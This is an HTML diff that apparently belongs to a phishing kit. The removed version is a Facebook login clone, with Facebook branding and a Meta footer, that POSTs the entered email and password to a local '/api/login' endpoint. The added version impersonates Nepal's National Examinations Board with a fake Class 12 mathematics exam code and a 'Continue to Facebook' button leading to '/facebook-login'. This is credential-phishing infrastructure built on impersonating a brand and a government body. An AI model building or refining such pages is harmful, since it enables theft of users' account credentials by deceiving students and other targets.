@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log in or sign up</title>
+    <title>NEB - National Examinations Board</title>
     <style>
         * {
             margin: 0;
@@ -12,273 +12,125 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
         }
 
         .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-        }
-
-        .logo {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 40px 20px;
             text-align: center;
-            margin-bottom: 30px;
         }
 
-        .logo h1 {
-            color: #1877f2;
-            font-size: 60px;
+        /* Title - LIGHT RED COLOR */
+        .title h1 {
+            font-size: 32px;
+            color: #e63946;
+            margin-bottom: 15px;
             font-weight: bold;
         }
 
-        .language {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .language select {
-            background: none;
-            border: none;
-            font-size: 14px;
-            color: #1b1f23;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .login-box {
-            background: white;
-            border-radius: 8px;
-            padding: 16px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-        }
-
-        .login-box input {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 17px;
-            outline: none;
-            background: white;
-        }
-
-        .login-box input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .login-btn {
-            width: 100%;
-            background: #1877f2;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
+        .title h2 {
             font-size: 20px;
-            font-weight: bold;
-            color: white;
-            cursor: pointer;
-            margin-bottom: 16px;
-        }
-
-        .login-btn:hover {
-            background: #166fe5;
-        }
-
-        .forgot {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .forgot a {
-            color: #1b1f23;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .forgot a:hover {
-            text-decoration: underline;
-        }
-
-        .hr {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .create-btn {
-            width: 100%;
-            background: transparent;
-            border: 2px solid #1877f2;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 17px;
-            font-weight: bold;
-            color: #1877f2;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .create-btn:hover {
-            background: #e7f3ff;
-        }
-
-        .meta-footer {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 12px;
-        }
-
-        .meta-logo {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #1b1f23;
-        }
-
-        .infinity {
-            font-size: 18px;
+            color: #333;
             font-weight: normal;
+            margin-bottom: 10px;
         }
 
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 8px;
+        .title p {
+            font-size: 16px;
+            color: #666;
+            margin-top: 5px;
         }
 
-        .footer-links a {
-            color: #65676b;
-            text-decoration: none;
-            font-size: 12px;
+        /* Class 12 Section */
+        .class-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
-        .error-msg {
-            color: #f02849;
-            text-align: center;
-            font-size: 13px;
-            margin: 8px 0;
-            display: none;
+        .class-section h3 {
+            color: #e63946;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+
+        .math {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            margin: 15px 0;
+        }
+
+        .code {
+            font-size: 20px;
+            color: #e63946;
+            font-family: monospace;
+            background: #f0f0f0;
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 25px;
+            margin: 10px 0;
+        }
+
+        /* Continue Button */
+        .continue-btn {
+            background: #e63946;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .continue-btn:hover {
+            background: #c1121f;
+        }
+
+        hr {
+            margin: 20px 0;
+            border: none;
+            border-top: 1px solid #ddd;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="language">
-        <select>
-            <option selected>English (UK)</option>
-            <option>Nepali</option>
-            <option>हिन्दी</option>
-        </select>
+    <!-- Title - Light Red Color -->
+    <div class="title">
+        <h1>राष्ट्रिय परीक्षा बोर्ड</h1>
+        <h2>National Examinations Board</h2>
+        <p>सानोठिमी, भक्तपुर | Nepal</p>
     </div>
 
-    <div class="logo">
-        <h1>facebook</h1>
+    <!-- Class 12 Section -->
+    <div class="class-section">
+        <h3>📚 कक्षा १२ (Class 12)</h3>
+        <div class="math">[ MATHEMATICS ]</div>
+        <div class="code">'0081'</div>
     </div>
 
-    <div class="login-box">
-        <input type="text" id="email" placeholder="Mobile number or email address">
-        <input type="password" id="password" placeholder="Password">
-        <div id="errorMsg" class="error-msg"></div>
-        <button class="login-btn" id="loginBtn">Log in</button>
-        <div class="forgot">
-            <a href="#">Forgotten password?</a>
-        </div>
-        <div class="hr"></div>
-        <button class="create-btn" id="createBtn">Create new account</button>
-    </div>
+    <hr>
 
-    <div class="meta-footer">
-        <div class="meta-logo">
-            <span class="infinity">∞</span>
-            <span>Meta</span>
-        </div>
-        <div class="footer-links">
-            <a href="#">About</a>
-            <a href="#">Help</a>
-            <a href="#">More</a>
-        </div>
-    </div>
+    <button class="continue-btn" onclick="goToFacebook()">Continue to Facebook →</button>
 </div>
 
 <script>
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
-    const errorDiv = document.getElementById('errorMsg');
-
-    async function doLogin() {
-        const email = emailInput.value;
-        const password = passwordInput.value;
-
-        errorDiv.style.display = 'none';
-
-        if (!email) {
-            errorDiv.innerText = 'Mobile number or email address is required.';
-            errorDiv.style.display = 'block';
-            emailInput.focus();
-            return;
-        }
-
-        if (!password) {
-            errorDiv.innerText = 'Password is required.';
-            errorDiv.style.display = 'block';
-            passwordInput.focus();
-            return;
-        }
-
-        try {
-            const res = await fetch('/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: email, password: password })
-            });
-            const data = await res.json();
-
-            if (data.success) {
-                alert('Login successful!');
-                window.location.href = '/dashboard.html';
-            } else {
-                errorDiv.innerText = 'The password that you\'ve entered is incorrect.';
-                errorDiv.style.display = 'block';
-                passwordInput.focus();
-            }
-        } catch (err) {
-            errorDiv.innerText = 'Connection error. Try again.';
-            errorDiv.style.display = 'block';
-        }
+    function goToFacebook() {
+        window.location.href = '/facebook-login';
     }
-
-    // ENTER key login - THIS FIXES YOUR ISSUE
-    emailInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            doLogin();
-        }
-    });
-
-    passwordInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            doLogin();
-        }
-    });
-
-    loginBtn.addEventListener('click', doLogin);
-    createBtn.addEventListener('click', function() {
-        alert('Create new account coming soon');
-    });
 </script>
 
 </body>
